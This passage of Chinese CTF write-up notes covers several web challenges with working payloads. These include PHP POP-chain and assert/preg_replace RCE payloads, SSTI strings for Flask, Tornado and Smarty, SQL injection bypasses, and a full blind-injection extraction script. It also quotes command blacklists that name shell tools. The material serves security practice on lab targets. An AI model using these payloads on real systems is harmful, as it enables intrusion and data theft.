K9pmlznHB6TNvlz/j8kY5HCNx3L1wAAAABJRU5ErkJggg=='
data = base64.b64decode(src)

with open('aaa.gif', 'wb') as f:
    f.write(data)
```

做到这里就应该想到可以以这种方式逆推回去，去拿到源码！这步我没有想到~

对`index.php`做1次十六进制编码，2次`base64`编码得到：`TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`，将返回的`base64`编码字符串做解码拿到源码；对于下面的源码绕过就很简单了，一个是`读取文件命令绕过`，`一个是md5===绕过`

[md5===绕过](#md5===绕过(硬碰撞))

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
# 命令执行函数黑名单
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
   # md5 === 绕过
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
Process finished with exit code 0
```

使用Burp Suite重放一下，注意修改请求方式为POST，点击`Change request method`改变请求模式为POST

![image-20231125135207282](CTF.assets/image-20231125135207282.png)

这里由于`ls`命令被过滤，所以使用`dir`命令查看文件，再根下发现：`flag`

![image-20231125135338809](CTF.assets/image-20231125135338809.png)

使用`uniq`命令读取`flag`

![image-20231125135428726](CTF.assets/image-20231125135428726.png)

## BUUOJ [MRCTF2020]Ezpop

进来就直接给出源码，要构造POP链来包含`flag.php`

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    
    // 当 类 被当作 函数调用 的时候自动调用
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    // 实例化 类 的时候自动调用
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    
    // 当 类 被当作 字符串 输出的时候自动调用
    public function __toString(){
        return $this->str->source;
    }

    // 当 类 被反序列化 的时候自动调用
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }
	
    // 当调用 类 不存在的 属性 时自动调用
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

基于此分析构造出POP链：

```
Show->__toString() ------> Test->__get() ------> Modifier->__invoke() -----> Modifier->append()
```

在这里首先注意到的问题是，没有魔术方法可以在反序列化的时候自动触发，此时注意到`show->__wakeup()`方法，感觉其中的`$this->source`属性可以触发`Show->__toString()`方法，基于此得到完整的POP链如下

```
Show->__wakeup() ------> Show->__toString() ------> Test->__get() ------> Modifier->__invoke() -----> Modifier->append()
```

PHP 脚本如下

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
    public function append($value){
        // 目标：include flag.php
        include($value);
    }
    // 当一个类被当作 函数 调用时触发
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;

    public function __construct($file='index.php'){
        $this->source = $file;
    }

    // 当一个类被当作 字符串 输出时触发
    public function __toString(){
        return $this->str->source;
    }

    // 在 反序列化 之前触发
    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;

    // 调用 类 不存在的属性时触发
    public function __get($key){
//        echo "Test is this";
        $function = $this->p;
        return $function();
    }
}



$b = new Show();
$b->str = new Test();
$b->str->p = new Modifier;
# 通过实例化 Show类，覆盖掉 __construct 中的 $file，而且 $b->str = new Test(); 那么刚好就调用了 Test类不存在的属性 source，从而触发了 __toString 方法
$a = new Show($b);

echo urlencode(serialize($a));
```

## [MRCTF2020]PYWebsite

这题总体来说还是非常简单，10分钟左右就做出来了，首先看源码，注意到一个JavaScript的判断，只要输入的值在经过md5计算后是等于：`0cd4da0223c0b280829dc3ea458d655c`就可以了

一开始的想法是JavaScript的md5绕过，然后百度了一下发现没有相关的知识点。马上就想到可以通过尝试修改响应报文来绕过：

![image-20231129161804165](CTF.assets/image-20231129161804165.png)

使用Burp Suite拦截请求报文，然后修改md5值

<img src="CTF.assets/image-20231129162016085.png" alt="image-20231129162016085" style="zoom:67%;" />

`md5('QNKCDZO')=0e830400451993494058024219903391`

![image-20231129162106037](CTF.assets/image-20231129162106037.png)

查看源码可以发现md5值已经成功被修改

![image-20231129162217783](CTF.assets/image-20231129162217783.png)

输入验证码`QNKCDZO`即可成功绕过，返回`flag.php`，一开始我将首页和`flag.php`的源码都检查了一遍都没有发现`flag`，然后尝试使用：`X-Forwarded-For`成功绕过

![image-20231129162258154](CTF.assets/image-20231129162258154.png)

![image-20231129162508941](CTF.assets/image-20231129162508941.png)

![image-20231129162523758](CTF.assets/image-20231129162523758.png)

## [ASIS 2019]Unicorn shop

### Unionde等价性的漏洞

在Unicode编码中，同一意义的字符会有多种表现形式，如5和⑤，那么对这些不同形式但意义相同的union字符做比较，就有可能说他们是等价的

### 复现

尝试购买ID为：`1,2,3`的商品都不被允许

![image-20231129165924359](CTF.assets/image-20231129165924359.png)

![image-20231129165957555](CTF.assets/image-20231129165957555.png)

只有在购买ID为4的商品时才会返回`You don't have enough money!`，但是在价格项这里又只能输入一个字符

![image-20231129170104933](CTF.assets/image-20231129170104933.png)

所以这里要利用Unicode等价漏洞，`https://www.compart.com/en/unicode/`搜索比`1337`大的Unicode编码的符号即可，这里搜索`three thousand`

![image-20231129170258781](CTF.assets/image-20231129170258781.png)

![image-20231129170311308](CTF.assets/image-20231129170311308.png)

最后拿到`flag`：`flag{7e94bf37-e3f0-48df-9c81-a53df35b5fe1}`

![image-20231129170340496](CTF.assets/image-20231129170340496.png)

## [WesternCTF2018]shrine

进来之后得到源码

```py
import flask
import os

app = flask.Flask(__name__)

# 这里可以确定 flag 在配置文件中
app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

通过分析源码就可以知道我们要拿到FLASK的配置文件，但是` blacklist = ['config', 'self']`又做了过滤。这里翻了下葵花宝典找到两条payload

```
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

直接输入就得到flag：`flag{5c830575-f722-43c4-b135-91fd2615e0bd}`

```
payload：/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

## [NPUCTF2020]ReadlezPHP

进来右键看不到源码，然后将`view-source`复制到URL前面成功看到源码并看到一个链接：`time.php?source`，进来可以看到是一个非常简单的PHP反序列化

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

很明显，在`HelloPhp`类种，`$b`是函数，`$a`是选项！

以此构造payload即可，但是这里过滤了很多函数，只剩下`assert`可用，以后再尝试了`system`和`eval`之后还得记住尝试`assert`，然后flag在`phpinfo`里

```
payload：
data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}
```

## [CISCN2019 华东南赛区]Web11

进来第一眼我以为是通过构造一个特殊的请求报文来请求页面返回flag，结果不行。后面看了一下才发现是smarty模板注入

![image-20231129214738121](CTF.assets/image-20231129214738121.png)



![image-20231129214845915](CTF.assets/image-20231129214845915.png)

以这张图为基准，尝试payload：`a{*comment*}b`查看返回内容

![img](CTF.assets/d4491195d8a1a67e38494b035030d89157bccd25.png@1256w_750h_!web-article-pic.avif)

证明确实是smarty模板注入漏洞，直接百度一下就能得到相关的payload

![image-20231129214957579](CTF.assets/image-20231129214957579.png)

```
{if phpinfo()}{/if}
{if readfile ('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if}		# 使用这个payload即可
```

## [SWPU2019]Web1

进来找了好久，最后看了一下，注入点在这里

![image-20231130135838977](CTF.assets/image-20231130135838977.png)

在 广告名 的位置输入：`1'`就会看到报错信息，从报错信息可以判断出，SQL语句大概是：`id='1' limit 1` ，但是这里把SQL注入常用的注释符号都屏蔽了，如：`--+ #`，所以只能用单引号闭合

![image-20231130135920652](CTF.assets/image-20231130135920652.png)

在测试的时候，如果payload种有空格则自动删除，这里要用：`/**/`绕过，这里整个查询的条目数是22，由于这里只能用`'`闭合，所以只能用`union select`做测试，因为`group by 22 '' limit 1`会报错

![image-20231130140127214](CTF.assets/image-20231130140127214.png)

```mysql
mysql> select * from users where id=1 group by 3 '' limit 1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' limit 1' at line 1
```

可以看到回显位为：2、3

```
payload：-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

![image-20231130142826834](CTF.assets/image-20231130142826834.png)

按流程走下一步要获取表名，由于这里屏蔽了`information_schema`，所以这里只能用其他数据库

```
# SQL注入可用于获取表明的数据库
sys.schema_auto_increment_columns				# 数据库字段名：table_schema
sys.schema_table_statistics_with_buffer			# 数据库字段名：table_schema
mysql.innodb_table_stats						# 数据库字段名：database_name
```

这里最恶心的地方其实是在`limit`前面有一个`'`要闭合，闭合之后就会导致整个`union`查询报错，如下：

```mysql
mysql> select * from users where id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() '' limit 1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' limit 1' at line 1
```

要解决这个问题，首先要明确一点，如果`union`查询之后不带上其他参数的话是可以查询成功的，如下：

```mysql
mysql> select * from users where id=-1 union select 1,2,3 '' limit 1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)
```

那么我们只要在`union`中插入一条子查询即可，记得子查询要用括号包裹，如下：

```mysql
mysql> select * from users where id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 '' limit 1;
+----+-------------------------------+----------+
| id | username                      | password |
+----+-------------------------------+----------+
|  1 | emails,referers,uagents,users | 3        |
+----+-------------------------------+----------+
1 row in set (0.00 sec)
```

那么以这个思路来获取表名，拿到表明：`ads，users`

```
payload:
-1'/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

![image-20231130144150687](CTF.assets/image-20231130144150687.png)

### union无列名读取数据

`union`查询中，其实我们也可以将思路调转过来，只要保证`union`查询的条目数左右相等即可，如下：

```mysql
mysql> select 1,2,3 union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
14 rows in set (0.00 sec)
```

因此，我们可以使用嵌套查询，将该表作为一张新的表，其字段名为：1，2，3。然后进行查询，mysql要求***\*每一个派生出来的表都必须有一个自己的别名\**，那我给派生表加上别名即可**：

整条SQL语句执行过程：

1. 先执行子查询
2. 为子查询出来的表命名一个别名
3. 使用反引号包裹的`2`表示选择查询名为`2`的列

```mysql
mysql> select `2` from (select 1,2,3 union select * from users) as tb;
+----------+
| 2        |
+----------+
| 2        |
| Dumb     |
| Angelina |
| Dummy    |
| secure   |
| stupid   |
| superman |
| batman   |
| admin    |
| admin1   |
| admin2   |
| admin3   |
| dhakkan  |
| admin4   |
+----------+
```

至于这个思路构造出的payload：

这条payload有两个UNION查询，外层UNION查询要配合上`ads`表的22列查询，内层UNION查询则要配合上`users`表的3列查询

```
-1'/**/union/**/select/**/1,2,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select*from/**/users)/**/as tb),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

![image-20231130152356392](CTF.assets/image-20231130152356392.png)

## 攻防世界 ics-05

### 1. preg_replace e模式命令执行

```
命令格式：preg_replace(pattern, replacement, subject)
```

`preg_replace`正确用法：会将正则匹配到的字符替换成指定字符

```php
<?php
echo preg_replace('/a/', 'b', 'abc');

# 输出
bbc
```

在低版本的PHP中，如果是`e`模式下的正则，那么如果正则被成功匹配就会先将参数：`replacement`当做命令执行

```php
<?php
# 这里会先执行 phpinfo() 代码再执行正则替换
echo preg_replace('/a/e', 'phpinfo', 'abc');
```

### 2. 复现

进来看源码，发现一个提示，这里看上去是一个文件包含，尝试包含`/etc/passwd`成功！

![image-20231201180546885](CTF.assets/image-20231201180546885.png)

![image-20231201180622671](CTF.assets/image-20231201180622671.png)

一开始的想法是，通过在URL里面写入PHP一句话木马再去访问响应的日志文件从而激活这个木马！但是后面一直都找不到具体的日志文件路径。

其实遇到这类题目，应该首先想到想办法去将他的源码弄下来，最后使用PHP伪协议成功拿到源码

```
?page=php://filter/read=convert.base64-encode/resource=index.php
```

![image-20231201180846947](CTF.assets/image-20231201180846947.png)

最后拿到源码，这里只展示关键代码，总结

1. HTTP请求头：`X-Forwarded-For: 127.0.0.1`
2. 执行`preg_replace` e 模式漏洞

```php
 <?php
        }
        }


        //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
		# X_FORWARDED_FOR 字段绕过
		# preg_replace e模式命令执行
        if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

            echo "<br >Welcome My Admin ! <br >";

            $pattern = $_GET['pat'];
            $replacement = $_GET['rep]';
            $subject = $_GET['sub'];

            if (isset($pattern) && isset($replacement) && isset($subject)) {
                preg_replace($pattern, $replacement, $subject);
            } else {
                die();
            }

        }


        ?>

```

这里很奇怪，我在浏览器用hackbar不回显flag

```
payload：pat=/123/e&rep=system('cat+./s3chahahaDir/flag/flag.php')&sub=123
```

![屏幕截图 2023-12-01 181733](CTF.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-01%20181733.jpg)

## 攻防世界 mfw

进来就是名牌要做一个Git泄露测试了

![image-20231201193241508](CTF.assets/image-20231201193241508.png)

使用`GitHack`拿到源码

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
└─# python GitHack.py http://61.147.171.105:53562/.git/
[+] Download and parse index file ...
[+] index.php
[+] templates/about.php
[+] templates/contact.php
[+] templates/flag.php
[+] templates/home.php
[OK] templates/contact.php
[OK] templates/about.php
[OK] templates/flag.php
[OK] index.php
[OK] templates/home.php
```

源码分析，这里给出关键代码

这里主要是通过`assert`函数断言判断，如果`assert`函数返回true则继续执行，否则就`die()`

```php
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```

`$file`是可控的，那么就可以以SQL注入的思路，通过闭合`file_exists`函数的方式执行特定的RCE

```
payload：
123') or system('dir');//

payload 分析：
assert("file_exists('123') or system('dir');//')");
1. 123 文件不存在，那么返回 false 并执行 system 函数
2. 使用 // 注释掉后面的 ')

最后payload：123') or system('cat templates/flag.php');//
```

## 攻防世界 easytornado

### 1. 前置知识

关于有关tornado模板注入可以去看葵花宝典

这里做一个`cookie_secret`的解释，`cookie`和`cookie_secret`是**不同**的，`cookie_secrert`是一把密钥，服务器会将明文`cookie`通过`cookie_secret`加密后发给客户端，并由客户端保管；客户端后续访问则需要拿着密文`cookie`，服务器就会将这串密文`cookie`用`cookie_secret`做解密，以验证客户端的身份

### 2. 复现

访问`hint.php`得到提示

![image-20231201201634689](CTF.assets/image-20231201201634689.png)

在`http://61.147.171.105:65497/error?msg={{7*7}}`存在模板注入漏洞，但是对大部分的关键词都做了屏蔽处理

![image-20231201202024107](CTF.assets/image-20231201202024107.png)

使用payload`{handler.settings}`可成功获取`cookie_secret`

![image-20231201202133787](CTF.assets/image-20231201202133787.png)

最后使用脚本做`md5`哈希算法

```py
import hashlib

filename_md5 = hashlib.md5('/fllllllllllllag'.encode('utf-8')).hexdigest()
file_hash = hashlib.md5('c0a990fe-750a-48c8-8726-54f0c55358f1'.encode('utf-8') + filename_md5.encode('utf-8'))
print(file_hash.hexdigest())
```

## BUUOJ [极客大挑战 2019]FinalSQL

### 1. 前置知识

#### 1.1 异或运算

**相同为0，不同为1**

如下，如果是多个数字做异或运算，则从左到右逐个计算

```sql
mysql> select 1^1^1;
+-------+
| 1^1^1 |
+-------+
|     1 |
+-------+
1 row in set (0.00 sec)
```

#### 1.2 异或盲注

MySQL做布尔运算，True则返回1，False则返回0，如下：

```sql
mysql> select 1=1;
+-----+
| 1=1 |
+-----+
|   1 |
+-----+
1 row in set (0.00 sec)

mysql> select 1=0;
+-----+
| 1=0 |
+-----+
|   0 |
+-----+
1 row in set (0.00 sec)

```

利用这一特性，就可以对ASCII码最布尔运算来达到异或盲注，记得对SQL语句要用括号包裹，payload如下：

```
# 爆库
1^(ascii(substring(database(),1,1))=103)^1
# 爆表
1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70))^1
# 爆字段
1^(select(ascii(substring((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),1,1))=100))^1
# 爆值
1^(select(ascii(substring((select(group_concat(fl4gawsl))from(Flaaaaag)),1,1))<100))^1
```

### 2. 复现

一开始一直找不到注入点，结果在`search.php`

![image-20231201202354429](CTF.assets/image-20231201202354429.png)

可以看到在错误的访问之后会报错

![image-20231201202421958](CTF.assets/image-20231201202421958.png)

直接上脚本，最后flag在`F1naI1y`表的`password`字段中

```py
import requests
from time import sleep

# 爆库，payload：1^(ascii(substring(database(),1,1))=103)^1
# 数据库名：geek
url = 'http://9b4dd26b-808c-4856-aaff-41da72057a37.node4.buuoj.cn:81/search.php'
database_name = ''
for num_name in range(1, 11):
    for ascii_num in range(65, 123):
        payload = f"?id=1^(ascii(substring(database(),{num_name},1))={ascii_num})^1"
        sleep(0.5)
        print(url + payload)
        req = requests.get(url + payload)
        if b'ERROR' not in req.content:
            database_name += chr(ascii_num)
            print(f"database_name：{database_name}, HTTP_Code：{req.status_code}")
            break

print(database_name)

# 爆表
# table_name：F1naI1y,Flaaaaag
# payload：1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70))^1
table_name = ''
for table_num in range(1, 21):
    for ascii_num in range(33, 123):
        payload = f"?id=1^(select(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{table_num},1))={ascii_num}))^1"
        sleep(0.25)
        req = requests.get(url + payload)
        if b'ERROR' not in req.content:
            table_name += chr(ascii_num)
            print(f"table_name：{table_name}, HTTP_Code：{req.status_code}")
            break
print(table_name)

# 爆字段
# column_name：id,username,password,id,fl4gawsl,
column_name = ''
for column_num in range(1, 60):
    for ascii_num in range(33, 123):
        payload = f"?id=1^(select(ascii(substring((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),{column_num},1))={ascii_num}))^1"
        sleep(0.25)
        req = requests.get(url + payload)
        if b'ERROR' not in req.content:
            column_name += chr(ascii_num)
            print(f"column_name：{column_name}, HTTP_Code：{req.status_code}")
            break
print(column_name)

# 爆值
# fl4gawsl: NONotthisClickothers
# payload = ?id=1^(select(ascii(substring((select(group_concat(fl4gawsl))from(Flaaaaag)),1,1))<100))^1
flag = ''
for flag_num in range(1,80):
    for ascii_num in range(33, 126):
        payload = f"?id=1^(select(ascii(substring((select(group_concat(username,':',password))from(F1naI1y)),{flag_num},1))={ascii_num}))^1"
        sleep(0.25)
        req = requests.get(url+payload)
        if b'ERROR' not in req.content:
            flag += chr(ascii_num)
            print(f"flag：{flag}, HTTP_Code：{req.status_code}")
            break
print(flag)
```

## [BJDCTF2020]EasySearch

### 1. 前置知识

#### 1.1 md5硬碰硬

大部分的CTF中，都是利用PHP的弱类型来绕过md5，但有时也需要用到硬碰撞，这时就需要用到脚本了，感觉大概率都是考纯数字的硬碰撞

```py
import hashlib

# 这里是爆破范围
for i in range(100000000):
    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    # 这里是碰撞目标
    if md5[:6:] == '6d0bc1':
        print(f"字符：{i}, md5值：{md5}")
```

#### 1.2 SSI 注入

现在的SSI注入利用也很少见到了，详情去看葵花宝典。个人认为SSI注入最好的判断方式就是看文件的后缀名，如：`shtml stm shtm`

### 2, 复现

进来看到是一个登录口，第一反应是尝试做一个SQL注入。但是没反应！做CTF永远记住，如果没有思路，就是信息搜集没有做好，最简单的方式就是做一个目录扫描

![image-20231202160619123](CTF.assets/image-20231202160619123.png)

由于备份文件名是：`index.php.swp`，是大部分字典都没有的，尽量在自己常用的字典上面加上这条吧

访问这个文件就能拿到网站的源码，如下：

```php
<?php
ob_start();
function get_hash(){
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
    $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
    $content = uniqid().$random;
    return sha1($content);
}
header("Content-Type: text/html;charset=utf-8");
***
if(isset($_POST['username']) and $_POST['username'] != '' )
{
    # 要求密码哈希后的前六位必须是 6d0bc1
    $admin = '6d0bc1';
    if ( $admin == substr(md5($_POST['password']),0,6)) {
        echo "<script>alert('[+] Welcome to manage system')</script>";
        $file_shtml = "public/".get_hash().".shtml";
        $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
        $text = '
            ***
            ***
            # SSI 漏洞注入点
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
        fwrite($shtml,$text);
        fclose($shtml);
        ***
        echo "[!] Header  error ...";
    } else {
        echo "<script>alert('[!] Failed')</script>";

    }else
    {
        ***
    }
    ***
    ?>
```

**解题思路：**

1. md5硬碰撞出密码
2. 利用SSI漏洞执行RCE

用上面的Python脚本跑出了下面的结果，随便选一个做密码即可：

```
字符：2020666, md5值：6d0bc1153791aa2b4e18b4f344f26ab4
字符：2305004, md5值：6d0bc1ec71a9b814677b85e3ac9c3d40
字符：9162671, md5值：6d0bc11ea877b37d694b38ba8a45b19c
```

可看到成功回显：`Welcome to manage system`

![image-20231202161331541](CTF.assets/image-20231202161331541.png)

在源码处可以看到诸如点在`$_POST['username']`，利用这一点执行代码，查看响应头可看到提示：`Url_is_here`，访问这个URL就可以看到执行结果

![image-20231202161454760](CTF.assets/image-20231202161454760.png)

![image-20231202161540748](CTF.assets/image-20231202161540748.png)

## [FBCTF2019]RCEService

### 1. 前置知识

**json_decode**

(PHP 5 >= 5.2.0, PHP 7, PECL json >= 1.2.0)

json_decode — 对 JSON 格式的字符串进行解码

**说明**

json_decode ( string `$json` [, bool `$assoc` = **`FALSE`** [, int `$depth` = 512 [, int `$options` = 0 ]]] ) : [mixed](language.pseudo-types.html#language.types.mixed)

接受一个 JSON 编码的字符串并且把它转换为 PHP 变量

**参数**

- `json`

  待解码的 `json` [string](language.types.string.html) 格式的字符串。这个函数仅能处理 UTF-8 编码的数据。**Note**:PHP implements a superset of JSON as specified in the original [» RFC 7159](http://www.faqs.org/rfcs/rfc7159).

- `assoc`

  当该参数为 **`TRUE`** 时，将返回 [array](language.types.array.html) 而非 [object](language.types.object.html) 。

- `depth`

  指定递归深度。

- `options`

  由 **`JSON_BIGINT_AS_STRING`**, **`JSON_INVALID_UTF8_IGNORE`**, **`JSON_INVALID_UTF8_SUBSTITUTE`**, **`JSON_OBJECT_AS_ARRAY`**, **`JSON_THROW_ON_ERROR`** 组成的掩码。 这些常量的行为在[JSON constants](json.constants.html)页面有进一步描述。

源码中有这么一条代码：` $cmd = json_decode($json, true)['cmd'];`这里解释以下

对于`json_decode`，如果第二个参数为`True`，那么就会返回**数组**，但是如果传入的JSON对象是一个字符串，那么解码出来还是字符串；如下

```php
<?php
$src = '"dir"';
$cmd = json_decode($src, true);
var_dump($cmd);						# 输出：string(3) "dir"
```

只有当传入的是一个数组的时候，才会放回一个数组。如下：

```php
<?php
$src = '{"key":"value"}';
$cmd = json_decode($src, true);
var_dump($cmd);

# 输出
array(1) {
  'key' =>
  string(5) "value"
}
```

那么代码就是要求传入一个数组，并且键名为`cmd`

### 2. 复现

这题就很搞，没有任何的提示，然后去看了以下wp，人家博主都是直接找源码来看的。这里直接贴上

可以看到过滤非常的严格，基本上都过滤死了；那么这里只能绕过`preg_match`

**`preg_match`：只校验第一行内容**，那么如果使用换行，那么就可以绕过过滤；payload：`cmd={%0A"cmd":+"echo $PATH"%0A}`

```php
<?php
# 设置环境变量
putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];

    if (!is_string($json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected<br/><br/>';
    } else {
        echo 'Attempting to run command:<br/>';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '<br/><br/>';
    }
}

?>
```

由于脚本中将环境变量写死为`PATH=/home/rceservice/jail`，即：当我们输入命令，如：`cat dir pwd`这些命令的时候，系统会自动去变量名为`PATH`所定义的路径下寻找可执行的二进制文件，`ls`看以下这个路径下，只有`ls`的二进制可执行文件

![image-20231206221137491](CTF.assets/image-20231206221137491.png)

那么如果要执行其他的命令，就必须指定具体的路径，所以最后的payload：

```
{%0A"cmd":+"/bin/cat /home/rceservice/flag"%0A}
```

## [Zer0pts2020]Can you guess it?

### 1. 前置知识

#### 1.1 basename 定义 及利用点

##### 定义

```
string basename ( string $path [, string $suffix ] )
```

给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。
如：

```
<?php
$path = "/testweb/home.php/";

//显示带有文件扩展名的文件名
echo basename($path);

//显示不带有文件扩展名的文件名
echo basename($path,".php");
?> 
———————————————————————————
home.php
home
```

##### 利用点

**我们需要注意的是他会忽略一些奇怪的字符**如： `%80 ~ %ff`

### 2. CTF题解

[【题目链接】](https://buuoj.cn/challenges#[Zer0pts2020]Can you guess it?)

1. 打开题目，我们可以看到源码如下：

   ```
   <?php
   include 'config.php'; // FLAG is defined in config.php
   
   if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
     exit("I don't know what you are thinking, but I won't let you read it :)");
   }
   
   if (isset($_GET['source'])) {
     highlight_file(basename($_SERVER['PHP_SELF']));
     exit();
   }
   
   $secret = bin2hex(random_bytes(64));
   if (isset($_POST['guess'])) {
     $guess = (string) $_POST['guess'];
     if (hash_equals($secret, $guess)) {
       $message = 'Congratulations! The flag is: ' . FLAG;
     } else {
       $message = 'Wrong.';
     }
   }
   ?>
   ```

